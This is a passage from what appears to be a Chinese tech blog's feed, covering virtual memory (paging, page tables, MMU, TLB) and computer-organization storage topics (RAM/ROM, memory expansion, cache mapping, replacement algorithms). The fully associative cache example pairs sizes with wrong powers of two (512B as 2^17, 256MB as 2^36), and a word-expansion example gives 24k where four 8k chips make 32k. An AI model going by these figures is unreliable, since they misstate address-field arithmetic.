比如说我们在程序中定义了一个指针，并且为它分配了空间，这块内存最终会分配到物理内存上。你不用担心其它程序会分配相同的物理内存。</p><p>3）虚拟内存技术也给每个进程提供了一致的、完整的地址空间。比如在操作系统上执行若干个进程，每个进程都有相同的地址空间，都在同样的起始位置放置了堆、栈以及代码段等。这样，它简化了像链接器、加载器这样的程序的内存管理。</p><h2 id="内存管理单元——页（Page）"><a href="#内存管理单元——页（Page）" class="headerlink" title="内存管理单元——页（Page）"></a>内存管理单元——页（Page）</h2><p>前文我们已经了解过，虚拟内存将主存视为磁盘的缓存，主存和磁盘上会通过数据传输来完成同步。然而，磁盘（特别是机械磁盘）的设计不能快速的读取或者写入一个字节一个字节的数据，因为它的<strong>随机读写</strong>性能比较差。比如系统要读取一个数组的所有数据，它就要访问数组的所有内存，而如果这些内存不在主存中，就得从磁盘上去装载数据到主存。那么如果是一个字节一个字节的读，可能就要在磁盘和主存之间传输 N 次数据，这样就会导致性能变得很差。</p><p>另外我们得为每个字节记录点什么信息，才可以知道这个内存是否已经被分配了，是否已经存在于主存中了。如果是按照一个字节一个字节的记录，那我们的大部分内存空间会用在了信息记录上面，而不是用于数据存储。</p><p>所以要想虚拟内存获得比较高的性能和内存利用率，必须由另外一种机制来提供。通过将虚拟内存分割为<strong>虚拟页（Virtual Page, VP）</strong>的大小固定的块来解决这些问题。也就是说，在磁盘和主存中传输数据，每次至少传输一个虚拟页，记录内存信息，也是按照虚拟页来记录。即虚拟页是磁盘和主存的数据传输和管理单元。这样如果是访问刚才那个数组，大部分情况下只要在磁盘和主存之间传输一次数据就够了（当然如果你的数组内存占用比较大，超过了一个虚拟页所能表示的大小，就要传输多次，但也比一个字节一个字节传输来得快非常多）。</p><p>和虚拟页对应的还有<strong>物理页</strong>，概念和虚拟页基本相同，除了它是存储在主存中的。因为是按照页作为传输单元的，所以物理页和虚拟页的大小一致。</p><p>一个虚拟页的大小通常通常由处理器的结构决定，一般情况下系统中的页大小都是一致的，比如说都是 4KB。当然，有些处理器还支持同时存在多个页大小。虚拟页的大小可以通过 sysconf 函数查询：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; /* sysconf(3) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The page size for this system is %ld bytes.\n&quot;</span>,</span><br><span class="line">           sysconf(_SC_PAGESIZE)); <span class="comment">/* _SC_PAGE_SIZE is OK too. */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚拟寻址"><a href="#虚拟寻址" class="headerlink" title="虚拟寻址"></a>虚拟寻址</h2><p>那一个进程可以用的内存究竟是多大呢？这主要受两方面的限制：</p><p>1）设置的<strong>交换空间</strong>的大小与物理内存大小的总和，虚拟内存存储在磁盘上面的空间就叫做交换空间，它通常对应一个文件或者是一个分区。所有进程共享同一个交换空间。如果交换空间和物理内存都被耗尽了，那么就不能再分配内存了。</p><p>2）进程可用的内存大小还受<strong>虚拟地址空间</strong>大小的影响。当一个进程的虚拟地址空间的所有地址都被分配了，那也不能再分配内存了。</p><p>在 32 位的程序中，由于指针的大小是 4 字节，所以它只能访问地址为 [0, 2^32) 的内存，它的地址数的总和是 4GB。而在 64 位的程序中，它能访问的地址范围是 [0, 2^64)，地址数的总和为 16EB (E = 2^60,exa,千兆兆)。</p><p>上面说的范围，如 [0, 2^32）表示的就是<strong>虚拟地址空间</strong>，指的是进程所能访问的所有的虚拟内存地址的集合。虚拟地址空间主要受程序的位数影响。除此之外，它还受 CPU 的实现的影响，比如 i7 处理器，它所支持的虚拟地址空间的范围是 [0, 2^48），即 256TB，不过一般这也够了。</p><p>除了虚拟地址空间之外，还有一个叫做<strong>物理地址空间</strong>的东西。顾名思义，物理地址空间表示的是所有能访问的物理地址的集合，它受计算机的主存大小影响。比如说，计算机的内存是 4GB，那么物理地址空间就是 [0, 2^32)。</p><p><strong>虚拟寻址</strong> 的意思就是将 <strong>虚拟地址空间</strong> 中的地址翻译成 <strong>物理地址空间</strong> 中的地址，然后再执行相关的读指令或者写指令。</p><h3 id="页表（Page-Table）"><a href="#页表（Page-Table）" class="headerlink" title="页表（Page Table）"></a>页表（Page Table）</h3><p>页表是记录页的状态的表，不同的进程间的页表是独立的。页表中的项叫做<strong>页表项（Page Table Entry, PTE）</strong>。</p><p>PTE 的数量为 <code>X=N/P</code>，其中 N 表示虚拟地址空间中的地址数量，P 表示页的大小。可以看出，在虚拟地址空间大小不变的情况下，页的大小越大，那么 PTE 的数量就越少；页的大小越小， PTE 的数量就越多。</p><p>PTE 记录了很多信息，这里列举几个重要的：</p><ol><li>有效位(P)，它标识对应的虚拟页面是否在物理内存中。</li><li>关联的物理页地址（Base addr），它表示的是对应的虚拟页存储在物理内存中的哪一页。</li><li>读写访问权限（R/W），表示对应的页是否为只读的，或者是可读可写的。</li><li>超级权限（U/S）表示该页是否只允许内核模式访问，还是用户模式也可以访问。</li><li>修改位（D），表示被加载到物理内存之后，页面的内容是否发生了修改。</li></ol><h3 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h3><p>PTE 按照<strong>虚拟页索引（VPN）</strong>排序，比如第 0 页位于的起始位置，第 1 页位于第 0 页后面，依此类推。VPN 是根据虚拟地址、页大小算出来的，比如页大小为 4KB，那第 0 页的地址就是页表的起始地址，第 1 页的地址就是页表地址+页大小，即 0x00001000。位于第 0 页和第 1 页之间的地址都属于第 0 页。</p><p>假设页大小为 4KB，地址空间为 32 位。系统将虚拟地址视为两部分组成，前 20 位表示页索引（VPN），后 12 位表示页偏移（VPO）。如果根据虚拟地址(VA)来写一个获取页索引(VPN)的公式就是： <code>VPN=VA&gt;&gt;12</code>。因为页大小是 4KB，所以一个虚拟地址需要使用 12（ 2^12=4KB ）位来描述这个地址在某页中的偏移量。那么剩下的位就用来索引 PTE。</p><p>在 CPU 中地址翻译由一个叫做 <strong>MMU（Memory Management Unit，内存管理单元）</strong>的硬件完成。 MMU 接收一个虚拟地址，并且输出一个物理地址。如果这个虚拟地址在物理内存中存在，那么就叫做页命中。如果这个虚拟地址在物理内存中不存在，那么 MMU 将产生一个<strong>缺页错误</strong>。</p><p>下图展示了 MMU 如何利用页表来实现虚拟地址到物理地址的映射。n 位的虚拟地址包括两个部分：一个 p 位的虚拟 VPO，和一个 n-p 位的 VPN。MMU 利用 VPN 来选择适当的 PTE。将 PTE 中的<strong>物理页号（PPN）</strong>与 VPO串联起来，就得到了相应的物理地址。注意：<strong>物理页面偏移（PPO）</strong>和 VPO 是相同的。</p><p><img src="https://xorex.space/image/243.jpg" alt="243.jpg"></p><p>下面具体描述页命中和缺页的处理流程。</p><h4 id="页命中"><a href="#页命中" class="headerlink" title="页命中"></a>页命中</h4><p>页命中指的是当 MMU 需要根据虚拟地址输出物理地址时，这个地址所在的页已经被装载到物理内存中了。即对应的 PTE 的有效为为 1。</p><p>下面是页命中时的地址翻译的过程：</p><ol><li>处理器生成一个虚拟地址，并把它传送给 MMU</li><li>MMU 生成根据虚拟地址生成 VPN，然后请求高速缓存/主存，获取 PTE 的数据。</li><li>高速缓存/主存向 MMU 返回 PTE 的数据</li><li>从 PTE 获取对应的物理页号 PPN。用物理页的基址加上页偏移 PPO（假设页大小为 4KB，那么页偏移就是虚拟地址的低 12 位，物理页的页偏移和虚拟页的页偏移相同），获取对应的物理地址。</li><li>主存/高速缓存将数据返回给 CPU。</li></ol><p><img src="https://xorex.space/image/244.jpg" alt="244.jpg"></p><h4 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h4><p>缺页是指当 CPU 请求一个虚拟地址时，虚拟地址所对应的页在物理内存中不存在。此时 MMU 会残生缺页错误，然后由内核的缺页处理程序从磁盘中调入对应的页到主存中。在处理完成后，CPU 会重新执行导致错误的指令，从而读取到对应的内存数据。</p><p>下面是缺页时的地址翻译的过程（第 1 步到第 3 步与页命中时相同）：</p><ol><li>处理器生成一个虚拟地址，并把它传送给 MMU</li><li>MMU 生成根据虚拟地址生成 VPN，然后请求高速缓存/主存，获取 PTE 的数据。</li><li>高速缓存/主存向 MMU 返回 PTE 的数据</li><li>由于判断出 PTE 的有效位是 0，所以 CPU 将出发一次异常，将控制权转移给内核中的缺页异常处理程序。</li><li>缺页异常处理程序确定出物理内存中的牺牲页，如果这个页面被修改过了（D 标志位为 1），那么将牺牲页换出到磁盘。</li><li>缺页处理程序从磁盘中调入新的页面到主存中，并且更新 PTE</li><li>缺页处理程序将控制权返回给原来的进程，再次执行导致缺页的指令。再次执行后，就会产生页命中时的情况了。</li></ol><p><img src="https://xorex.space/image/245.jpg" alt="245.jpg"></p><h4 id="翻译加速"><a href="#翻译加速" class="headerlink" title="翻译加速"></a>翻译加速</h4><p>从页命中的流程图中可以看出，CPU 每次需要请求一个虚拟地址，MMU 就需要从内存/高速缓存中获取 PTE ，然后再根据 PTE 的内容去从物理内存中加载数据。</p><p>这样在最坏的情况下，相当于从内存/高速缓存中多读取了一次数据。许多 MMU 包含了一个关于 PTE 的小缓存，叫做 <strong>TLB（Translation Lookaside Buffer，翻译后备缓冲器）</strong>来消除这样的开销。</p><p>TLB 将虚拟内存的 VPN 视为由索引和标记组成，<strong>索引部分（TLBI）</strong>用来定位 TLB 中的缓存数据项，<strong>标记部分（TLBT）</strong>用来校验存储的数据项是否为指定的 VPN 对应的数据。</p><p><img src="https://xorex.space/image/246.jpg" alt="246.jpg"></p><p>如果 TLB 命中了，那么所有的地址翻译步骤都是在 MMU 中执行的，所以非常快。下面是 TLB 命中时的操作流程</p><ol><li>处理器生成 1 个虚拟地址</li><li>MMU 向 TLB 请求 PTE</li><li>TLB 返回 PTE 到 MMU</li></ol><p>如下图所示，其中第 4 步和第 5 步与之前的流程一致。</p><p><img src="https://xorex.space/image/247.jpg" alt="247.jpg"></p><p>如果 TLB 未命中，MMU 就必须从高速缓存/内存中获取相应的 PTE，然后将新取出来的 PTE 放在 TLB 中。如下图所示</p><p><img src="https://xorex.space/image/248.jpg" alt="248.jpg"></p><p>理解 TLB 需要注意的是，因为不同进程的页表内容是不一致的，因此内核在切换上下文时，会重置 TLB。</p><h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>前文有提到过，PTE 的数量由虚拟地址空间的大小和页大小决定。也就是：X=N/P。那如果我们有一个 32 位的物理地址空间、4KB 的页面和 一个 4 字节的 PTE。即使程序只使用了一小部分虚拟地址空间，也总是需要一个 4MB （ 4*2^32/2^12 )的页表常驻主存。对于 64 位的系统来说，情况将变得更加复杂。</p><p>设计者非常聪明，它将页表设计成一个包括多级的层次结构来解决这个问题。</p><p>下图展示了一个两级页表的层次结构。二级页表中的每个 PTE 项都负责一个 4KB 页面，而一级页表中的每个 PTE 负责 1024 个二级页表项。</p><p><img src="https://xorex.space/image/249.jpg" alt="249.jpg"></p><p>注意，常驻内存的只是一级页表，系统可以在需要时才创建、页面调入二级页表。这样就减少了主存的压力。另外如果一级页表中的一个 PTE 是空的，那么相应的二级页表就根本不存在。这样在一个只需要少量内存的程序上，绝大部分二级页表是不存在的。</p><p>下图展示的是一个 k 级层次页表的结构图，起始就是将 VPN 部分划分为多个段，每个段都代表某一级页表。而每一级中的 PTE 的 Base addr 为下一级提供入口地址。最后一级的 Base addr 则表示最终物理地址的 PPN。</p><p><img src="https://xorex.space/image/250.jpg" alt="250.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;本文转自与 知乎-安佳玮 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/61587598&quot;&gt;深入虚拟内存（Virtual Memory，VM）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们应该知道&lt;strong&gt;物理内存（Physica</summary>
      
    
    
    
    <category term="计算机体系" scheme="https://xorex.space/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
    
    <category term="计算机组成原理" scheme="https://xorex.space/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计组-存储系统</title>
    <link href="https://xorex.space/2021/05/08/530c4fb06907/"/>
    <id>https://xorex.space/2021/05/08/530c4fb06907/</id>
    <published>2021-05-08T09:04:25.000Z</published>
    <updated>2021-05-14T12:06:05.798Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主存的简单模型"><a href="#主存的简单模型" class="headerlink" title="主存的简单模型"></a>主存的简单模型</h2><p>首先看一个主存储器的模型图：</p><p><img src="https://xorex.space/image/228.jpg" alt="228.jpg"></p><p>存储元：存储一个高低电位的最小单位。</p><p>存储单元：多个存储元组成的集合。</p><p>存储字：存放在一个存储单元中的二进制代码组合，也就是一组数据。</p><p>译码器：将地址存储器中的读写地址翻译成主存的读取控制电路。</p><p>片选线：整个芯片的开关，用高低电平表示是否在工作。作用于控制存储容量的扩充。多个存储器芯片同时开，同时关，实现存储器每次取出的位数的扩充，位扩展（一个存储单元能存储的最长信息位）。多个芯片轮流开轮流关，实现存储器存储单元数量的扩充，字扩展（增加内存地址的范围，能存下更多条数据）。两者结合可以实现字和位同时的扩充。</p><p>寻址：按照地址寻找到在某处的操作数。寻址有很多中，比如按字节寻址（也就是 8bit 大小位一个地址），按字寻址（计算机字长大小位一个地址），等等。</p><h2 id="RAM-分类"><a href="#RAM-分类" class="headerlink" title="RAM 分类"></a>RAM 分类</h2><p>随机存储器 Random Access Memory，这里的随机存储意思是无论在存储器的任何位置写入数据，所需要的时间都为电流经过的时间，耗时基本相同。并不是写入的数据会随机分布的意思。大部分随机存储器的特点就是保存数据需要通电，一旦断电就会数据丢失。</p><p>RAM 为了减少译码器的控制电路的复杂度，往往将大量的存储单元编上行地址和列地址，这样能大大减少控制电路电线的数量并通过两次分别传入行地址和列地址来降低地址线的带宽，如下行地址器和列地址器：</p><p><img src="https://xorex.space/image/229.jpg" alt="229.jpg"></p><p>但是需要注意的是，因为将地址复用，并分两次分别传入行地址和列地址，所以就需要单独将确定存储器工作状态的片选线给拆分成<strong>行片选线</strong>和<strong>列片选线</strong>，分别确定行和列是否在工作状态。</p><ol><li>SRAM (Static) 静态随机存储器：</li></ol><ul><li><p>是使用双稳态多谐振荡器/触发器（设计复杂）作为数据存储的容器，读取数据不会破坏原有的状态。</p></li><li><p>这里的静态表示存储器只要保持通电，里面储存的数据就可以恒常保持。</p></li><li><p>特点是：能耗高，速度极快，成本极高，集成度较低，常常作为 Cache。</p></li></ul><ol start="2"><li>DRAM (Dynamic) 动态随机存储器，</li></ol><ul><li><p>是使用电容/晶体管（设计简单）作为数据存储的容器，读取数据会破坏原有的状态。</p></li><li><p>这里的动态表示电容会漏电，所以需要定时充电才可以保持存储的数据。</p></li><li><p>特点是：能耗低，速度较快，成本较低，集成度较高，常常作为主存。</p></li></ul><h2 id="DRAM-读取刷新周期"><a href="#DRAM-读取刷新周期" class="headerlink" title="DRAM 读取刷新周期"></a>DRAM 读取刷新周期</h2><ul><li>内存刷新</li></ul><p>因为 DRAM 的电容器一般来说只能在 2ms 内保证存储数据的稳定，所以说在 2ms 内，需要进行一次充电来刷新数据。刷新的过程为读取原有内容并按照原有内容进行一次完全充电，时间基本等同于一次读写周期</p><p>而由于主存的单次控制的读写每一次只能作用于一整行或者一整列，所以 2ms 内需要执行刷新电路 n 或 m 次。对于这么多的刷新次数，要么在 2ms 内分散开来刷新，要么在 2ms 内挑一个时间集中刷新完毕。</p><p>前者为异步刷新，后者为集中刷新。因为刷新的时候内存是无法被访问的，所以为了保证连续的性能，一般采用异步刷新：将所有的刷新任务均匀的分散在 2ms 内。</p><ul><li>内存读取周期</li></ul><p>A 表示 Address 表示读取地址。</p><p>CS 表示片选线，上面加上横线表示低电位为工作状态，高电位为无效状态。</p><p>Dout 表示读取数据总线，用于接收读取的数据。</p><p><img src="https://xorex.space/image/230.jpg" alt="230.jpg"></p><ul><li>内存写入周期</li></ul><p>Din 表示写入数据总线，用于提供要写入的数据。</p><p><img src="https://xorex.space/image/231.jpg" alt="231.jpg"></p><hr><p>通过上面的读写周期的图可以看到，每一个过程并不是严格的同时进行，完成就关闭的，而是维持为了维持电路的稳定性做了一些等待。</p><h2 id="ROM"><a href="#ROM" class="headerlink" title="ROM"></a>ROM</h2><p>ROM 指的是 Read Only Memory 只读存储器。</p><p>我们使用 CPU + RAM 作为一个主机就可以单独工作了，CPU 从 RAM 中读取指令并解析执行。但是因为 RAM 拥有断电就失去数据的特性，所以需要外界有一个能持久存储数据的介质存储操作系统运行执行，在主机开始运行之前，将持久存储的指令通过 IO 来写入 RAM 中，为 CPU 的最初运行提供指令。</p><p>而当时能够提供持久化存储的介质只有 ROM，也就是它们只能写入一次，之后只能读取。</p><p>但是市场越来越需要能够持久化存储的介质，并且对他们的写入要求也越来越高（能写入的话就可以自己存储数据了），于是随着科技的进步，逐渐发展出来了读和写都非常厉害的持久化存储介质。虽说这些介质能能够写入数据，但是由于历史原因、本身写入性能低于读取、和 RAM 有较大差别，这些介质仍然被称为 ROM。</p><ul><li><p>MROM (Mask) 掩模式只读存储器 只有在出厂前的制造过程可以存储数据，出场之后就无法写入了，只能读，严格意义上的 ROM。</p></li><li><p>PROM (Programmable) 可编程只读存储器，出场后可以自己用专门的写入机器写入数据，写入之后同样是只能读取内容。CD-ROM 就是 PROM 的一种。</p></li><li><p>EPROM (Erasable Programmable) 可擦除可编程存储器，很有限的擦除重写，严格意义上已经脱离了只读存储器了。</p></li><li><p>Flash-ROM 基于 Flash 闪存技术的存储器，发展于 RAM，通过在电容间加入绝缘层和电感应读取数据解决了漏电的问题，变成了可持久化的存储介质。</p></li><li><p>HDD-ROM 机械硬盘，基于机械运动寻址和磁力存储，基本已经被淘汰。</p></li><li><p>SSD-ROM Flash 闪存的加强版，通过加入强大的读写驱动来大幅度提高读写性能，现在已经烂大街了。</p></li></ul><p>需要注意的是 Flash 和加强版的 SSD 不仅仅属于 ROM，同样数据 RAM，因为它们作为半导体的电存储元器件也满足随机存储的特性：无论在存储器的任何位置写入数据，所需要的时间都为电流经过的时间，耗时基本相同。</p><p>SSD 为什么叫作固态硬盘呢，可能是 固体电容 在英语中为 Solid，被翻译成了固态的原因吧，反正各种命名都奇奇怪怪的。</p><h2 id="存储器分类"><a href="#存储器分类" class="headerlink" title="存储器分类"></a>存储器分类</h2><ul><li><p>随机存储器 这里专门指的是 RAM，也就是电脑里面的内存，大部分语境里面都不是指无论在存储器的任何位置写入数据，所需要的时间都为电流经过的时间，耗时基本相同，所以这里要记住！！！</p></li><li><p>顺序存取存储器 这里的顺序就是完全定义上的顺序，指的是像磁带这种，不能精确定位数据并读取的存储器，只能从头到尾顺序读取。</p></li><li><p>直接存取存储器 这里指能够计算定位并直接去相应位置存储数据的存储器，现代存储器基本上都支持这个功能。</p></li><li><p>相联存储器 是一种不根据地址而是根据存储内容来进行存取的存储器，里面内置了比较器。相联：两个无关之物之间的联系。</p></li></ul><h2 id="存储器性能指标"><a href="#存储器性能指标" class="headerlink" title="存储器性能指标"></a>存储器性能指标</h2><p>存取周期：存储器进行一次完整的读写操作所需要的时间。</p><p>主存带宽：又称为数据传输率或存储速度，每秒从主存中进出信息的最大数量，计算方式为：数据宽度/存储周期。</p><h2 id="存储器的扩展"><a href="#存储器的扩展" class="headerlink" title="存储器的扩展"></a>存储器的扩展</h2><h3 id="位扩展"><a href="#位扩展" class="headerlink" title="位扩展"></a>位扩展</h3><p>指增加存储器的存储字的长度，通过片选线控制多个存储器芯片同时开，同时关，实现存储器每次取出的位数的扩充，位扩展（一个存储单元能存储的最长信息位）。</p><p>下图表示将 8 个 1 位的存储器通过位扩展的方式扩展为字长为 8 的存储器，存储器芯片处于同时开的状态，其中 WE 表示的是读写控制总线：</p><p><img src="https://xorex.space/image/232.jpg" alt="232.jpg"></p><h3 id="字扩展"><a href="#字扩展" class="headerlink" title="字扩展"></a>字扩展</h3><p>指增加存储器的存储字的数量，多个芯片轮流开轮流关，实现存储器存储单元数量的扩充，字扩展（增加内存地址的范围，能存下更多条数据）。</p><p>下图表示将四个 8k 个存储字数量的存储器通过字扩展为 24k 的存储字数量的存储器，其中译码器负责将传送过来的的存储器工作编号移码为对应的片选线电路：</p><p><img src="https://xorex.space/image/233.jpg" alt="233.jpg"></p><p>译码器的存在还有一个非常重要的作用就是让整个内存地址都有意义，地址的开头几位可以表示子存储器的编号，对应整个大存储器也保证了地址的连续性。</p><h3 id="字和位同时扩展"><a href="#字和位同时扩展" class="headerlink" title="字和位同时扩展"></a>字和位同时扩展</h3><p>将上面的两个结合在一起就可以了：</p><p><img src="https://xorex.space/image/234.jpg" alt="234.jpg"></p><h3 id="译码器"><a href="#译码器" class="headerlink" title="译码器"></a>译码器</h3><p>下面是一个常见的 38 译码器，A1 A2 A3 接收一个 3 位二进制数，然后能映射到对应的 Yn 的电位输出，常用于映射对应片选线来决定子存储器的工作状态。</p><p>需要注意的是译码器还有三个接口的使能端，带圆点要接入低电位（接地），第一个要接入高电位，只有 100 这样的使能端被接入，才能支持译码器的正确工作。否则译码器会将所有的 Y 都输出高电位。</p><p><img src="https://xorex.space/image/235.jpg" alt="235.jpg"></p><h2 id="存储器性能优化"><a href="#存储器性能优化" class="headerlink" title="存储器性能优化"></a>存储器性能优化</h2><p>因为 CPU 的性能提升实在是太快了，存储器也需要提高自己的性能来满足 CPU 才可以。</p><h3 id="双端口-RAM"><a href="#双端口-RAM" class="headerlink" title="双端口 RAM"></a>双端口 RAM</h3><p>双端口 RAM 指的是一个 RAM 可以连接两个 CPU，和两个 CPU 进行数据交换，提高 RAM 的利用率。</p><p><img src="https://xorex.space/image/236.jpg" alt="236.jpg"></p><p>同时读取不同的数据：允许</p><p>同时写入不同的数据：允许</p><p>同时读取相同的数据：允许</p><p>同时写入相同的数据：禁止</p><p>同时一个读取一个写入相同的数据：禁止</p><p>这种双端口 RAM 其实也就大规模服务器（会有很多个 CPU）会用到，提高 RAM 的利用率，对于实际的读写性能提升并不明显。</p><h3 id="多模块存储器"><a href="#多模块存储器" class="headerlink" title="多模块存储器"></a>多模块存储器</h3><p><img src="https://xorex.space/image/237.jpg" alt="237.jpg"></p><p>多模块存储器的性能优化有两个方向，正如上面的图一样，一个方向是实现多体并行存储器，另外一个方向是实现单体多字存储器。</p><h4 id="多体并行存储器"><a href="#多体并行存储器" class="headerlink" title="多体并行存储器"></a>多体并行存储器</h4><p>多体并行看字面意思就是实现了一个有多个存储体能并行读取的存储器。</p><p>我们都知道在读取内存数据的时候整个读写周期为 <code>读写时间+恢复时间</code> 因为恢复时间有点耗时，那么多体并行存储器就想办法那它做文章。</p><p>看上图的地址编址，连续的地址是分散在不同的存储体中的，那么我们在读取连续的数据的时候，就可以先读取第一个存储器的 01 数据，拿到数据之后无需等待回复时间，直接去读取下一个存储体 02 数据。就像下面一样，避免在同一个存储体中连续读取数据，从而节约了恢复时间的开销。</p><p><img src="https://xorex.space/image/238.jpg" alt="238.jpg"></p><p>实现在不同的存储体连续读写的只需要改变对原本地址的解析方式即可，截取最后几位（取决于存储体的数量）解析为体号，确定去哪个存储体中读写数据，而前面数据为存储体内地址，用来寻找具体的存储单元。</p><p>比如 00010110 这个地址，为寻找 22 号存储体，按照最上面的多体并行存储器的图，我们截取后两位为体号，却认为 2 号存储体。然后解析前面的 000101 确定为 2 号存储体的 5 号存储体，这样就找到了多体并行存储器里面的 22 号存储体了，也就是 00010110 地址。</p><h4 id="单体多字存储器"><a href="#单体多字存储器" class="headerlink" title="单体多字存储器"></a>单体多字存储器</h4><p>看上面的图，单体多字存储器有点类似于位扩展，都是扩展了同时读取的数据长度，但是不同的是单体多字存储器是同时读取多个字。</p><p>扩张 MDR 和数据线路，来实现同时读取多个连续字的数据，从而提高读取速度，真正的并发处理。</p><p>实现原理就是电路一次读取一行的多个存储单元的信息，然后同时输出到数据线路，将这些连续的数据交给 CPU（其实是 Cache）。</p><p>一般来说优化都是上面两种存储器的结合体，多体多字并行存储器。</p><h2 id="Cache-概念"><a href="#Cache-概念" class="headerlink" title="Cache 概念"></a>Cache 概念</h2><p>因为 CPU 运算时间和内存的数据读取时间差异实在是太大了，导致了 CPU 大量的时间都浪费在了等待内存数据上面，为了提高数据读取效率，这里引入了一个中间存储器，叫作缓存，使用快速而又昂贵的 SRAM ，这个东西的速度能大大减少 CPU 等待数据时间。</p><p>因为昂贵，那么能存在 Cache 里面的数据只能是少量的，那么 Cache 是怎么知道 CPU 需要内存的哪些数据呢？</p><p>这里是根据局部性原理，分为空间局部性和时间局部性，空间局部性就是当前使用的数据的周围数据很有可能未来被使用，例子就是数组数据。时间局部性就是当前使用的数据很有可能未来被使用，例子就是循环变量。</p><p>通过局部性原理来设计预测算法，提高 CPU 所需数据在 Cache 里面的命中率，从而提高整体的存储结构的性能。</p><p>这里计算 Cache 的效率取决于 Cache 速度和命中率，都很好理解，就不单独解释了。</p><h2 id="Cache-工作原理"><a href="#Cache-工作原理" class="headerlink" title="Cache 工作原理"></a>Cache 工作原理</h2><h3 id="内存-gt-Cache"><a href="#内存-gt-Cache" class="headerlink" title="内存 -&gt; Cache"></a>内存 -&gt; Cache</h3><p>内存和 Cache 进行一次数据交换的单位是 Cache Line 的大小，需要一个存储单元的数据就将这个存储单元所属于的以 Cache Line 大小分的小组的全部成员全部放到 Cache 中，这也是局部性原理的体现。而内存以 Cache Line 的大小划分为单元，被称为内存 Line 。</p><p>下面主要是介绍内存中数据是放置到 Cache 中的哪些数据，并且是如何识别是否为 CPU 想要的数据的。</p><h4 id="全相联映射"><a href="#全相联映射" class="headerlink" title="全相联映射"></a>全相联映射</h4><p>全相联映射指的是所有的内存和 Cache 映射都是采用相联映射方式，也就是根据在 Cache 行开头标记的内存地址前几位来确定在内存中的位置（用比较器来根据内容映射）。因此采用全相联映射的 Cache 可以将内存中的数据随意放置。</p><p>需要放置到 Cache 的数据，依次从 Cache 中寻找空位，如果有，就直接放进去。假设 Cache 大小为 512B（2^17），有八条 Cache Line 每条大小为 64B（2^14），于其进行数据交换的内存大小为 256MB（2^36），则：</p><p><img src="http://xorex.space/image/239.jpg" alt="239.jpg"></p><ol><li><p>需要有效位 1 位，用来表示这个位置是否已经存在数据，1 表示有数据，0 表示没有数据。</p></li><li><p>需要内存 Line 编号 22 位（36-14），确定这个 Cache Line 里面的数据是属于内存的哪一块区域的，直接截取里面任意数据内存地址的前 22 位，其值即为内存 Line 的编号。</p></li><li><p>需要 17 位来存放一个 Cache Line 单位的内存数据，用来和 CPU 进行快速数据读写。</p></li></ol><p>CPU 去命中数据只需要先去找内存 Line 编号是否存在，如果存在则直接按照地址后 17 位从所在的 Cache line 中读取即可。</p><ul><li><p>优势：利用空余位置比较灵活，看到空位就可以直接使用。</p></li><li><p>劣势：Cache Line 为了定位差找里面数据对应内存的位置，需要有设计较为复杂的比对电路。</p></li></ul><h4 id="直接映射"><a href="#直接映射" class="headerlink" title="直接映射"></a>直接映射</h4><p><img src="http://xorex.space/image/240.jpg" alt="240.jpg"></p><p>直接映射就好办了，我们将内存 Line 分为 Cache Line 数量个的小组（意味着属于这个小组的内存 Line 数据会放到小组所需与的 Cache Line 中）</p><p>将小组内部的的内存 Line 的后几位作为在小组里面的编号（从 0 到 最大数量-1），记录到 Cache Line 前面，用来定位里面的数据具体属于这个小组里面的那个成员的。</p><ul><li><p>优势：因为一个 Cache Line 中的数据内存建立了严格的位置映射关系，所以 CPU 差找数据方便快速，不用设计复杂的对比电路。</p></li><li><p>劣势：因为一个内存 Line 映射的 Cache Line 只有一个位置，所以需要频繁的更替数据，灵活性差。</p></li></ul><h4 id="组相联映射"><a href="#组相联映射" class="headerlink" title="组相联映射"></a>组相联映射</h4><p><img src="https://xorex.space/image/241.jpg" alt="241.jpg"></p><p>组相联映射的意思就是以小组划分的方式映射位置（根据位置映射），小组而内部采用相联映射（根据内容映射）。</p><p>这种方法是将上面的两种方法结合起来（老经典了），先分组，但是每一组里面有多条 Cache Line，这些可以被所属于此分组的内存 Line 数据随意放入。</p><p>这样就结合了上面两者的优点。</p><p>最后总结一下上面的三种映射方式：</p><p><img src="https://xorex.space/image/242.jpg" alt="242.jpg"></p><h3 id="Cache-满了处理"><a href="#Cache-满了处理" class="headerlink" title="Cache 满了处理"></a>Cache 满了处理</h3><p>当内存的数据放入 Cache 中时，发现已经没有位置了，那么对于有多个可选择的替换位置，该替换哪个位置的数据呢？下面介绍四种算法。</p><ol><li><strong>随机算法 RAND</strong></li></ol><p>Random，虽说是随机，但是还是有一些算法的，这里需要参考操作系统相关。</p><ol start="2"><li><strong>先进先出算法 FIFO</strong></li></ol><p>First In First Out，使用队列实现，找出最早加入 Cache 的数据，将其替换。</p><ol start="3"><li><strong>近期最少使用 LRU</strong></li></ol><p>Least Recently Used，使用计数法，所有的数据都随着 CPU 访问而加一，如果数据被 CPU 命中，则计数清零。找出里面数据最大的，就是近期最少被命中的数据，将其替换，如果有多个最大，使用 FIFO 原则。</p><ol start="4"><li><strong>最不经常使用 LFU</strong></li></ol><p>Least Frequency Used，使用计数法，被 CPU 